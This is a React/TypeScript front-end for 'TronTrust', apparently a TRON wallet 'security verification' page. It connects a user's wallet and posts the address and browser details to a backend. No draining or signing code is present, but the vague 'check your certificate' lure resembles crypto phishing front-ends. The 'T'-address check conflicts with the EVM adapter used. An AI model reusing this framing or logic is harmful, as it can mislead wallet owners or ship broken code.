import { useState, useEffect } from 'react';
import { createAppKit } from '@reown/appkit';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { FaBolt, FaCog, FaShieldAlt, FaQuestionCircle, FaWallet } from 'react-icons/fa';

type WalletData = {
address: string;
chainId: number;
network: string;
walletType: string;
sessionId: string;
metadata: {
userAgent: string;
timestamp: number;
};
};

const WalletConnect = () => {
const [currentWallet, setCurrentWallet] = useState<WalletData | null>(null);
const [modal, setModal] = useState<ReturnType<typeof createAppKit> | null>(null);
const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
const [isConnecting, setIsConnecting] = useState(false);
const [connectionStatus, setConnectionStatus] = useState<'idle' | 'connecting' | 'connected' | 'error'>('idle');

const toggleMobileMenu = () => {
setMobileMenuOpen(!mobileMenuOpen);
};

const API_BASE_URL = 'http://localhost:5000/api';
const PROJECT_ID = '048110749acfc9f73e40e560cd1c11ec';

const log = (message: string) => {
console.log(`[TronTrust] ${message}`);
};

const tronMainnet = {
id: 728126428,
name: 'TRON Mainnet',
network: 'tron',
nativeCurrency: {
decimals: 6,
name: 'TRON',
symbol: 'TRX',
},
rpcUrls: {
public: { http: ['https://api.trongrid.io'] },
default: { http: ['https://api.trongrid.io'] },
},
blockExplorers: {
default: { name: 'Tronscan', url: 'https://tronscan.org' },
},
};

const tronShasta = {
id: 2494104990,
name: 'TRON Shasta Testnet',
network: 'tron-shasta',
nativeCurrency: {
decimals: 6,
name: 'TRON',
symbol: 'TRX',
},
rpcUrls: {
public: { http: ['https://api.shasta.trongrid.io'] },
default: { http: ['https://api.shasta.trongrid.io'] },
},
blockExplorers: {
default: { name: 'Shasta Tronscan', url: 'https://shasta.tronscan.org' },
},
testnet: true,
};

useEffect(() => {
const initializeAppKit = async () => {
try {
const wagmiAdapter = new WagmiAdapter({
projectId: PROJECT_ID,
networks: [tronMainnet, tronShasta]
});
const appKit = createAppKit({
adapters: [wagmiAdapter],
projectId: PROJECT_ID,
networks: [tronMainnet, tronShasta],
defaultNetwork: tronMainnet,
metadata: {
name: 'TronTrust',
description: 'TRON Wallet Security Verification App',
url: 'https://trontrust.io',
icons: ['https://trontrust.io/favicon.ico']
},
features: {
analytics: true,
email: false,
socials: [],
history: true,
onramp: false
},
themeMode: 'light',
themeVariables: {
'--w3m-font-family': 'Inter, sans-serif',
'--w3m-accent': '#FF060A',
'--w3m-color-mix': '#FF060A',
'--w3m-color-mix-strength': 20
},
chainImages: {
728126428: 'https://cryptologos.cc/logos/tron-trx-logo.png',
2494104990: 'https://cryptologos.cc/logos/tron-trx-logo.png'
},
includeWalletIds: [
'4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
'38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662',
'19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927',
'c286eebc742a537cd1d6818363e9dc53b21759a1e8e5d9b263d0c03ec7703576',
],
excludeWalletIds: [
'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
]
});
setModal(appKit);
log('TronTrust AppKit initialized successfully for TRON network ONLY');
appKit.subscribeAccount((account: { isConnected: boolean; address?: string; caipAddress?: string; chainId?: number }) => {
log(`Account state changed: ${JSON.stringify(account)}`);
if (account.isConnected && account.address) {
if (!account.address.startsWith('T')) {
log('Invalid TRON address format - disconnecting');
setConnectionStatus('error');
setIsConnecting(false);
return;
}
log(`TRON Wallet connected: ${account.address}`);
setIsConnecting(false);
setConnectionStatus('connected');
const chainId = account.chainId || 728126428;
if (chainId !== 728126428 && chainId !== 2494104990) {
log(`Invalid chain ID ${chainId} - expecting TRON chain ID`);
setConnectionStatus('error');
setIsConnecting(false);
return;
}
const walletData = {
address: account.address,
chainId: chainId,
network: chainId === 728126428 ? 'TRON Mainnet' : 'TRON Shasta Testnet',
walletType: 'TRON',
sessionId: Date.now().toString(),
metadata: {
userAgent: navigator.userAgent,
timestamp: Date.now()
}
};
setCurrentWallet(walletData);
saveWalletToAPI(walletData);
} else {
log('TRON Wallet disconnected');
setIsConnecting(false);
setConnectionStatus('idle');
if (currentWallet) {
removeWalletFromAPI(currentWallet.address);
}
setCurrentWallet(null);
}
});
appKit.subscribeNetwork((network: { chainId?: string | number }) => {
log(`Network changed: ${JSON.stringify(network)}`);
let chainIdNum: number | undefined;
if (typeof network.chainId === 'string') {
chainIdNum = parseInt(network.chainId, 10);
} else if (typeof network.chainId === 'number') {
chainIdNum = network.chainId;
}
if (currentWallet && chainIdNum !== undefined && !isNaN(chainIdNum)) {
if (chainIdNum === 728126428 || chainIdNum === 2494104990) {
log(`TRON network changed to: ${chainIdNum}`);
const updatedWallet = {
...currentWallet,
chainId: chainIdNum,
network: chainIdNum === 728126428 ? 'TRON Mainnet' : 'TRON Shasta Testnet'
};
setCurrentWallet(updatedWallet);
saveWalletToAPI(updatedWallet);
} else {
log(`Non-TRON chain detected (${chainIdNum}) - disconnecting`);
handleDisconnect();
setConnectionStatus('error');
}
}
});
appKit.subscribeState((state: any) => {
log(`Modal state: ${JSON.stringify(state)}`);
if (state.open === false && isConnecting) {
setTimeout(() => {
if (!currentWallet) {
setIsConnecting(false);
setConnectionStatus('idle');
}
}, 1000);
}
});
} catch (error) {
log(`Error initializing TronTrust AppKit: ${error instanceof Error ? error.message : String(error)}`);
setConnectionStatus('error');
setIsConnecting(false);
}
};
initializeAppKit();
}, []);

const saveWalletToAPI = async (walletData: WalletData) => {
try {
log(`Saving TRON wallet to API: ${walletData.address}`);
const response = await fetch(`${API_BASE_URL}/connect-wallet`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
},
body: JSON.stringify(walletData)
});
if (!response.ok) {
throw new Error(`HTTP error! status: ${response.status}`);
}
const result = await response.json();
if (result.success) {
log(`TRON wallet saved to API successfully: ${walletData.address}`);
return result;
} else {
log(`Error saving TRON wallet: ${result.error || 'Unknown error'}`);
return null;
}
} catch (error) {
log(`API Error saving TRON wallet: ${error instanceof Error ? error.message : String(error)}`);
return null;
}
};

const removeWalletFromAPI = async (address: string) => {
try {
log(`Removing TRON wallet from API: ${address}`);
const response = await fetch(`${API_BASE_URL}/disconnect-wallet`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
},
body: JSON.stringify({ address })
});
if (!response.ok) {
throw new Error(`HTTP error! status: ${response.status}`);
}
const result = await response.json();
if (result.success) {
log(`TRON wallet removed from API successfully: ${address}`);
return result;
} else {
log(`Error removing TRON wallet: ${result.error || 'Unknown error'}`);
return null;
}
} catch (error) {
log(`API Error removing TRON wallet: ${error instanceof Error ? error.message : String(error)}`);
return null;
}
};

const handleConnect = async () => {
if (!modal) {
log('Cannot open TRON wallet connection modal: modal is not initialized.');
setConnectionStatus('error');
return;
}
try {
log('Opening TRON wallet connection modal...');
setIsConnecting(true);
setConnectionStatus('connecting');
await modal.open({ 
view: 'Connect'
});
log('TRON wallet connection modal opened successfully');
} catch (error) {
log(`Error opening TRON connection modal: ${error instanceof Error ? error.message : String(error)}`);
setIsConnecting(false);
setConnectionStatus('error');
}
};

const handleDisconnect = async () => {
if (!modal) {
log('Cannot disconnect TRON wallet: modal is not initialized.');
return;
}
try {
log('Disconnecting TRON wallet...');
await modal.disconnect();
log('TRON wallet disconnected successfully');
} catch (error) {
log(`Error disconnecting TRON wallet: ${error instanceof Error ? error.message : String(error)}`);
}
};

const getConnectionButtonText = () => {
switch (connectionStatus) {
case 'connecting':
return 'Connecting to TRON...';
case 'connected':
return 'Disconnect TRON Wallet';
case 'error':
return 'Retry TRON Connection';
default:
return 'Connect TRON Wallet';
}
};

const isConnectionButtonDisabled = () => {
return isConnecting || connectionStatus === 'connecting';
};

return (
<div className="min-h-screen bg-gradient-to-br from-red-50 to-white">
<nav className="bg-white shadow-sm border-b border-gray-100">
<div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
<div className="flex justify-between items-center h-16">
<div className="flex items-center space-x-3">
<div className="w-8 h-8 bg-red-600 rounded-lg flex items-center justify-center">
<svg className="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 24 24">
<path d="M12 2L2 7L12 12L22 7L12 2ZM2 17L12 22L22 17M2 12L12 17L22 12" />
</svg>
</div>
<span className="text-xl font-bold text-gray-900">TronTrust</span>
</div>
<div className="hidden md:flex items-center space-x-6">
<a href="#" className="flex items-center space-x-2 text-gray-600 hover:text-red-600 transition-colors">
<FaBolt className="text-sm" />
<span className="text-sm">Features</span>
</a>
<a href="#" className="flex items-center space-x-2 text-gray-600 hover:text-red-600 transition-colors">
<FaCog className="text-sm" />
<span className="text-sm">How It Works</span>
</a>
<a href="#" className="flex items-center space-x-2 text-gray-600 hover:text-red-600 transition-colors">
<FaShieldAlt className="text-sm" />
<span className="text-sm">Verification Status</span>
</a>
<a href="#" className="flex items-center space-x-2 text-gray-600 hover:text-red-600 transition-colors">
<FaQuestionCircle className="text-sm" />
<span className="text-sm">FAQ</span>
</a>
</div>
<button className="hidden md:flex items-center space-x-2 bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700 transition-colors">
<FaWallet className="text-sm" />
<span>TRON Wallet Security Check</span>
</button>
<button 
className="md:hidden p-2 rounded-lg text-gray-600 hover:text-red-600 hover:bg-gray-50"
onClick={toggleMobileMenu}
>
<svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
<path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16M4 18h16"></path>
</svg>
</button>
</div>
</div>
{mobileMenuOpen && (
<div className="md:hidden bg-white border-t border-gray-100">
<div className="px-4 py-3 space-y-3">
<a href="#" className="flex items-center space-x-2 text-gray-600 hover:text-red-600 py-2">
<FaBolt className="text-sm" />
<span className="text-sm">Features</span>
</a>
<a href="#" className="flex items-center space-x-2 text-gray-600 hover:text-red-600 py-2">
<FaCog className="text-sm" />
<span className="text-sm">How It Works</span>
</a>
<a href="#" className="flex items-center space-x-2 text-gray-600 hover:text-red-600 py-2">
<FaShieldAlt className="text-sm" />
<span className="text-sm">Verification Status</span>
</a>
<a href="#" className="flex items-center space-x-2 text-gray-600 hover:text-red-600 py-2">
<FaQuestionCircle className="text-sm" />
<span className="text-sm">FAQ</span>
</a>
<button className="w-full flex items-center justify-center space-x-2 bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700 mt-3">
<FaWallet className="text-sm" />
<span>TRON Wallet Security Check</span>
</button>
</div>
</div>
)}
</nav>
<main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
<div className="mb-12">
<div className="bg-white rounded-xl p-6 shadow-sm border border-gray-100">
<div className="flex justify-between items-center mb-6">
<div className="w-full bg-gray-200 rounded-full h-2">
<div className={`bg-red-600 h-2 rounded-full transition-all duration-500 ${connectionStatus === 'connected' ? 'w-1/2' : 'w-1/4'}`}></div>
</div>
</div>
<div className="flex justify-between items-center text-sm">
<div className="flex items-center space-x-2">
<div className="w-6 h-6 bg-red-600 rounded-full flex items-center justify-center">
<svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
<path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path>
</svg>
</div>
<span className="text-gray-900 font-medium">Get Started</span>
</div>
<div className="flex items-center space-x-2">
<div className={`w-6 h-6 rounded-full flex items-center justify-center ${connectionStatus === 'connected' ? 'bg-red-600' : 'bg-gray-300'}`}>
<svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
<path d="M9.5 2A1.5 1.5 0 0 0 8 3.5v1A1.5 1.5 0 0 0 9.5 6h5A1.5 1.5 0 0 0 16 4.5v-1A1.5 1.5 0 0 0 14.5 2h-5ZM12 7a5 5 0 0 1 5 5v1.086l1.707 1.707A1 1 0 0 1 18 16.5V17a1 1 0 0 1-1 1H7a1 1 0 0 1-1-1v-.5a1 1 0 0 1 .293-.707L8 14.086V12a5 5 0 0 1 5-5Z" />
</svg>
</div>
<span className={connectionStatus === 'connected' ? 'text-gray-900 font-medium' : 'text-gray-500'}>Scan</span>
</div>
<div className="flex items-center space-x-2">
<div className="w-6 h-6 bg-gray-300 rounded-full flex items-center justify-center">
<svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
<path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z" />
</svg>
</div>
<span className="text-gray-500">Results</span>
</div>
<div className="flex items-center space-x-2">
<div className="w-6 h-6 bg-gray-300 rounded-full flex items-center justify-center">
<svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
<path d="M12 2C13.1 2 14 2.9 14 4C14 5.1 13.1 6 12 6C10.9 6 10 5.1 10 4C10 2.9 10.9 2 12 2ZM21 9V7L15 1H5C3.89 1 3 1.89 3 3V21C3 22.11 3.89 23 5 23H19C20.11 23 21 22.11 21 21V9M19 9H14V4L19 9Z" />
</svg>
</div>
<span className="text-gray-500">Waitlist</span>
</div>
</div>
</div>
</div>
<div className="text-center mb-12">
<h1 className="text-4xl md:text-5xl font-bold text-gray-900 mb-4">
CHECK YOUR TRON CERTIFICATE NOW
</h1>
<p className="text-xl text-gray-600 max-w-2xl mx-auto">
Connect your TRON wallet to begin the security verification process
</p>
</div>
<div className="space-y-6">
<div className="bg-white rounded-xl p-6 shadow-sm border border-gray-100">
<div className="flex items-center justify-between">
<div className="flex items-center space-x-4">
<div className="w-12 h-12 bg-red-100 rounded-lg flex items-center justify-center">
<svg className="w-6 h-6 text-red-600" fill="currentColor" viewBox="0 0 24 24">
<path d="M12 2L2 7L12 12L22 7L12 2ZM2 17L12 22L22 17M2 12L12 17L22 12" />
</svg>
</div>
<div>
<h3 className="text-lg font-semibold text-gray-900">TRON WALLET</h3>
<p className="text-gray-600">Connect to TRON Network Only</p>
</div>
</div>
<button 
onClick={connectionStatus === 'connected' ? handleDisconnect : handleConnect}
className={`px-6 py-3 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors flex items-center space-x-2 ${isConnectionButtonDisabled() ? 'opacity-50 cursor-not-allowed' : ''}`}
disabled={isConnectionButtonDisabled()}
>
{isConnecting && (
<svg className="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
<circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
<path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
</svg>
)}
<span>{getConnectionButtonText()}</span>
</button>
</div>
</div>
<div className="bg-white rounded-xl p-6 shadow-sm border border-gray-100">
<div className="flex items-center space-x-4">
<div className="w-12 h-12 bg-red-100 rounded-lg flex items-center justify-center">
<svg className="w-6 h-6 text-red-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
<path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 3l7 4v5c0 5-3.5 9.74-7 11-3.5-1.26-7-6-7-11V7l7-4z" />
<circle cx="12" cy="12" r="3" fill="currentColor" />
</svg>
</div>
<div>
<h3 className="text-lg font-semibold text-gray-900">TRON NETWORK SECURITY</h3>
<p className="text-gray-600">We only connect to TRON network. No Ethereum or other chains supported.</p>
</div>
</div>
</div>
</div>
{connectionStatus !== 'idle' && (
<div className={`mt-6 p-4 rounded-lg flex items-center space-x-3 ${
connectionStatus === 'connecting' ? 'bg-red-50 text-red-700 border border-red-200' : 
connectionStatus === 'connected' ? 'bg-green-50 text-green-700 border border-green-200' : 
'bg-red-50 text-red-700 border border-red-200'
}`}>
{connectionStatus === 'connecting' && (
<svg className="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
<circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
<path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
</svg>
)}
{connectionStatus === 'connected' && <span className="text-2xl">🔥</span>}
{connectionStatus === 'error' && <span className="text-2xl">❌</span>}
<span className="font-medium">
{connectionStatus === 'connecting' && 'Connecting to TRON network...'}
{connectionStatus === 'connected' && 'Successfully connected to TRON network'}
{connectionStatus === 'error' && 'TRON connection failed. Please try again.'}
</span>
</div>
)}
{currentWallet && (
<div className="mt-6 bg-red-50 border-2 border-red-200 rounded-xl p-6">
<h3 className="text-lg font-semibold text-red-800 mb-4 flex items-center space-x-2">
<svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
<path d="M12 2L2 7L12 12L22 7L12 2ZM2 17L12 22L22 17M2 12L12 17L22 12" />
</svg>
<span>Connected TRON Wallet:</span>
</h3>
<div className="space-y-3">
<div className="flex flex-col sm:flex-row sm:items-center sm:justify-between">
<span className="font-medium text-gray-700">TRON Address:</span>
<span className="font-mono text-red-700 break-all">{currentWallet.address}</span>
</div>
<div className="flex flex-col sm:flex-row sm:items-center sm:justify-between">
<span className="font-medium text-gray-700">Network:</span>
<span className="font-bold text-red-700">{currentWallet.network}</span>
</div>
<div className="flex flex-col sm:flex-row sm:items-center sm:justify-between">
<span className="font-medium text-gray-700">Chain ID:</span>
<span className="text-gray-600">{currentWallet.chainId}</span>
</div>
<div className="flex flex-col sm:flex-row sm:items-center sm:justify-between">
<span className="font-medium text-gray-700">Session ID:</span>
<span className="font-mono text-gray-600">{currentWallet.sessionId}</span>
</div>
</div>
<div className="mt-4 p-3 bg-green-100 border border-green-200 rounded-lg text-green-800 flex items-center space-x-2">
<span className="text-xl">🔥</span>
<span className="font-medium">Successfully connected to TRON network and synced with API</span>
</div>
</div>
)}
</main>
</div>
);
};

export default WalletConnect;